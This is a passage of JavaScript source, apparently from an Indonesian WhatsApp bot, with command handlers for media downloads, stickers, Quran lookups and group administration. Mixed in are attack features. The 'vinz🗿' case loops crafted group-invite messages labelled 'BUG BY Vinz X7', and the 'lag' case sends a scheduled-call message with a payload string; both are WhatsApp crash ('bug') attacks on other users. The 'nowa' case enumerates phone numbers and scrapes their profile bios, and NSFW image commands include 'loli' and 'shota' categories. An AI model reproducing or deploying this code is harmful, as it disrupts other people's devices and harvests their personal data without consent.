            if (!isCreator && global.db.data.users[m.sender].limit < 4) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 4
                replyv1(`🚩 4 Limit Used`)
if (!dtext) return replyv1(`Example : ${prefix + command} Lagu sad`)
let search = await yts(`${dtext}`)
let caption = `*YOUTUBE PLAY*

あ ID : ${search.all[0].videoId}
あ Title : ${search.all[0].title}
あ Views : ${search.all[0].views}
あ Duration : ${search.all[0].timestamp}
あ Channel : ${search.all[0].author.name}
あ Upload : ${search.all[0].ago}
あ URL Video : ${search.videos[0].url}
あ Description : ${search.videos[0].description}

_Please wait, the audio file is being sent..._`
let todd = await getBuffer(search.all[0].image)
vinz.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
vinz.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg' }, {quoted: m})
   })
}
break
case 'closetime': {
if (!m.isGroup) return replycallv1(mess.group)
if (!isBotGroupAdmins) return replycallv1(mess.botAdmin)
if (!isGroupAdmins) return replycallv1('Lah Dikira Admin Group Kali')
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return replycallv1('*Choose:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
replycallv1(`Close Time ${dtext} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
vinz.groupSettingUpdate(m.chat, 'announcement')
replycallv1(close)
}, timer)
}
break
case 'opentime': {
if (!m.isGroup) return replycallv1(mess.group)
if (!isBotGroupAdmins) return replycallv1(mess.botAdmin)
if (!isGroupAdmins) return replycallv1(mess.botAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return replycallv1('*Choose:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
replycallv1(`Open Time ${dtext} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
vinz.groupSettingUpdate(m.chat, 'not_announcement')
replycallv1(open)
}, timer)
}
break
case  'qc':{
if (!isCreator && global.db.data.users[m.sender].limit < 6) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 6
                replyv1(`🚩 6 Limit Used`)
let teks = m.quoted && m.quoted.q ? m.quoted.text : dtext ? dtext : "";
if (!teks) return replyv1(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await vinz.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await vinz.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await vinz.sendImageAsSticker(m.chat, buffer, m, { packname: global.botname, 
author: global.outh, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
case 'smeme':
if (!isCreator && global.db.data.users[m.sender].limit < 6) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 6
                replyv1(`🚩 6 Limit Used`)
 if (!dtext) return replyv1(`Balas Image Dengan Caption ${prefix + command}`)
if (!quoted) return replyv1(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
replyv1('*Sabar Cuy Loading*')
mee = await vinz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${dtext}.png?background=${mem}`)
vinz.sendImageAsSticker(m.chat, kaytid, m, { packname: global.botname, author: global.outh })
}
break
case 'wmvideo':{
let teks = `${dtext}`
{
 if ((quoted.msg || quoted).seconds > 11) return replyv1('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await vinz.sendVideoAsSticker(m.chat, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
return replyv1(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
}
break
case 'jadianime': {
			if (!isCreator && global.db.data.users[m.sender].limit < 50) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 50
                replyv1(`🚩 50 Limit Used`)
                if (isMedia) {
                    const media = await vinz.downloadAndSaveMediaMessage(quoted)
                    const anu = await uptotelegra(media)
                    await 
                    vinz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=${apikey}&img=${anu}` }, caption: mess.done }, { quoted: m })
                } else {
                replyv1('Reply gambar nya bang')
                }
            }
            break
            case 'vinz🗿':
            if (!isCreator && global.db.data.users[m.sender].limit < 30000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 30000
                replyv1(`🚩 30000 Limit Used`)
                jumlah = "5"
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: vinz.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `Vinz X7 ${virtexpc}`,
"groupName": `©XXT PRIVATE★ SINCE 2023🧙‍♂️${virtexpc}\nKONTOL LU`,
"caption": `BUG BY Vinz X7 ${virtexpc}, ${buttonkal}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:trolibg})
vinz.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
//▮                         ▮
//▮▮                    ▮
//▮     ▮               ▮
//▮          ▮          ▮
//▮               ▮     ▮
//▮                    ▮▮
//▮                         ▮
//
//▮                         ▮
//     ▮               ▮
//          ▮     ▮
//               ▮
//               ▮
//              ▮
//               ▮
//
//     ▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮▮
//▮               ▮
//▮               ▮
//▮               ▮
//
//▮▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮
//▮     ▮
//▮          ▮
//▮               ▮
//
//▮▮▮▮▮
//          ▮
//          ▮
//         ▮
//          ▮
//         ▮
//▮▮▮▮▮
//
//
//
//     ▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮▮
//▮               ▮
//▮               ▮
//▮               ▮
//
//▮▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮
//▮
//▮
//▮
//
//     ▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮▮
//▮               ▮
//▮               ▮
//▮               ▮
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
case 'rulesbot': case 'peraturanbot':
anu = `${rulesbot}`
replyv1(anu)
break
case 'peredambg': case 'peredambug': case 'abug':
anu = `${antibugbot}`
replyv1(anu)
break
case 'peredamvirrex': case 'p': case 'lag': {
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: fdoc })
vinz.relayMessage(m.chat, schedule.message, { messageId: schedule.key.id })
	}
attention(`${antimainansampah} , ${antimainansampah}`)
}
break

case 'public':
if (!isAuthor) return replyv1(mess.Author)
vinz.public = true
reply('Sukse Change To Public')
break
case 'self':
if (!isAuthor) return replyv1(mess.Author)
vinz.public = false
reply('Sukse Change To Self')
break
case 'join': {
if (!isAuthor) return replyv1(mess.Author)
if (!dtext) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await vinz.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'resetlinkgc':
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
vinz.groupRevokeInvite(m.chat)
break
case 'editgroup': {   
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
if (args[0] === 'close'){
await vinz.groupSettingUpdate(m.chat, 'announcement').then((res) => eply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await vinz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
vinz.sendMessage(m.chat, { image: thumb, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
case 'promote': {
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinz.groupParticipantsUpdate(m.chat, [users], 'promote')
}
break
case 'demote': {
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinz.groupParticipantsUpdate(m.chat, [users], 'demote')
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
 xxt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await vinz.sendMessage(m.chat, { audio: xxt, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: `${gclu}`,
title: `${outh}`,
sourceUrl: `${gclu}`, 
thumbnail: thumb0
}
}})
break
case 'listsurah':
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
.then(({ data }) => {
var text = 'List Surah:\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
reply(text)
})
.catch(console.error)
break

case 'alquran':
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
reply(text)
})
.catch(console.error)
break

case 'alquranaudio':
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
vinz.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' }, {quoted: m})
break

case 'asmaulhusna':
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
axios
.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
.then(({ data }) => {
var text = `No : ${data.result.index}\n`
text += `Latin: ${data.result.latin}\n`
text += `Arab : ${data.result.ar}\n`
text += `Indonesia : ${data.result.id}\n`
text += `English : ${data.result.en}`
reply(text)
})
.catch(console.error)
break

case 'kisahnabi':
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Name : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Story : \n${data.result.story}`
reply(text)
})
.catch(console.error)
break

case 'jadwalsholat':
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Wilayah : ${data.result.wilayah}\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.maghrib}\n`
text += `Isya : ${data.result.isya}`
reply(text)
})
.catch(console.error)
break

case 'stalktiktok': case 'tts': case 'tt': 
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${full_args}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
vinz.sendMessage(m.chat, { image: { url: data.result.user_picture }, caption })
})
break
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko2':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
case 'kill':
case 'pat':
case 'lick':
case 'bite':
case 'yeet':
case 'bonk':
case 'wink':
case 'poke':
case 'nom':
case 'slap':
case 'smile':
case 'wave':
case 'blush':
case 'smug':
case 'glomp':
case 'happy':
case 'dance':
case 'cringe':
case 'highfive':
case 'handhold':
if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
vinz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } }, {quoted:troli})
break
case 'ceklimit': 
        case 'checklimit': 
        case 'limit':{
					replyv1('*Limit Lu :* ' + (db.data.users[m.sender].limit))
					}
	    break
//-----------------------------------------//
//FITUR NSFW - API BY LOL HUMAN
case 'blowjob':
case 'ero':
case 'armpits':
case 'milf':
case 'hentai4everyone':
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
vinz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}` } }, {quoted:m})
break
case 'hentai':
case 'anal':
case 'holoero':
case 'kuni':
case 'keta':
case 'lewd':
case 'femdom':
case 'futanari':
case 'eroyuri':
case 'erokemo':
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
vinz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } }, {quoted:m})
break
//=================================================//
case 'neko' :
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
vinz.sendMessage(m.chat, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted:troli }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'waifu' :
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
vinz.sendMessage(m.chat, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted:fkontak }).catch(err => {
 return('Error!')
})
break
case 'hidetag': {
if (!m.isGroup) return replywalu(mess.group)
if (!isGroupAdmins && !isCreator) return replywalu('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
vinz.sendMessage(m.chat, {
    text: dtext ? dtext : '',
    mentions: participants.map(a => a.id)
}, {
    quoted: fdoc
})
  }
  break
  case 'tagall': {
if (!m.isGroup) return
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${dtext ? dtext : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
vinz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:troli })
}
break
  case 'editinfo': {
if (!isAuthor) return replywalu(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
 if (args[0] === 'open'){
await vinz.groupSettingUpdate(m.chat, 'unlocked').then((res) => replywalu(`Sukses Membuka Edit Info Group`)).catch((err) => replywalu(jsonformat(err)))
 } else if (args[0] === 'close'){
await vinz.groupSettingUpdate(m.chat, 'locked').then((res) => replywalu(`Sukses Menutup Edit Info Group`)).catch((err) => replywalu(jsonformat(err)))
 } else {
 vinz.sendMessage(m.chat, { image: thumb0, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:troli}) 

}
}
break
case 'editsubjek': {
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
if (!dtext) return replywalu('Text Nya ?')
await vinz.groupUpdateSubject(m.chat, dtext).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'editdesk':{
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
if (!dtext) return replywalu('Text Nya ?')
await vinz.groupUpdateDescription(m.chat, dtext).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'kick': {
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinz.groupParticipantsUpdate(m.chat, [users], 'remove')
}
break
case 'add': {
if (!isAuthor) return replywalu(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
let users = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinz.groupParticipantsUpdate(m.chat, [users], 'add')
}
break
case 'nowa': 
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
{
              if (!dtext) return replywalu(`Masukkan nomor, contoh ${prefix+command} 62857527651xx`)
              var noteks = args[0]
              if (!noteks.includes('x')) return reply('Masukkan akhiran x untuk mencari nomor?')
              function countInstances(string, word) {
                return string.split(word).length - 1;
              }
              var nomer0 = noteks.split('x')[0]
              var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')]: ''
              var random_length = countInstances(noteks, 'x')
              if (random_length > 4) {
                return replywalu('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
              }
              var random;
              reply('Loading')
              if (random_length == 1) {
                random = 10
              } else if (random_length == 2) {
                random = 100
              } else if (random_length == 3) {
                random = 1000
              } else if (random_length == 4) {
                random = 10000
              }
              var nomerny = `Have a bio\n`
              var no_bio = `\nWithout Bio / Default bio.\n`
              var no_watsap = `\nNot registered on whatsapp\n`
              var data = {}
              for (let i = 0; i < random; i++) {
                var nu = ['1','2','3','4','5','6','7','8','9']
                var t1 = nu[Math.floor(Math.random() * nu.length)]
                var t2 = nu[Math.floor(Math.random() * nu.length)]
                var t3 = nu[Math.floor(Math.random() * nu.length)]
                var t4 = nu[Math.floor(Math.random() * nu.length)]
                var rndm;
                if (random_length == 1) {
                  rndm = `${t1}`
                } else if (random_length == 2) {
                  rndm = `${t1}${t2}`
                } else if (random_length == 3) {
                  rndm = `${t1}${t2}${t3}`
                } else if (random_length == 4) {
                  rndm = `${t1}${t2}${t3}${t4}`
                }
                var anu = await vinz.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
                var anuu = anu.length !== 0 ? anu: false
                try {
                  try {
                    var anu1 = await vinz.fetchStatus(anu[0].jid)
                  } catch {
                    var anu1 = '401'
                  }
                  if (anu1 == '401' || anu1.status.length == 0) {
                    no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                  } else {
                    const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
                    if (!(year in data)) {
                      data[year] = [];
                    }
                    data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
                  }
                } catch {
                  no_watsap += `${nomer0}${i}${nomer1}\n`
                }
              }
              const bio = Object.keys(data)
              .map((key) => {
                return `*[ ${key} ]*\n${data[key].join('')}`
              })
              .join('\n')
              const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
              reply(hasil)
              }
              break
case 'kudeta':
if (!isAuthor) return replyv1(mess.Author)
if (!dtext) return replywalu('Nama?😁')
if (!m.isGroup) return replywalu(mess.group)
vinz.groupUpdateSubject(m.chat, `${dtext}`)
vinz.groupUpdateDescription(m.chat, `${dtext}`)
await replywalu(`*Sukses Kudeta.*\nNickname: ${dtext}`)
break
case 'getidgc': case 'getid':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
{
if (!dtext) return replywalu("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
vinz.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
reply(tekse)

})
}
break
case 'sendlinkgc': {
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!args[0]) return replywalu(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let response = await vinz.groupMetadata(m.chat)
vinz.sendMessage(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m)

}
break
case 'linkgroup': case 'linkgc': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
const url = await vinz.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
replywalu(asu)
}
break
case 'blackpink':
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'magma':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
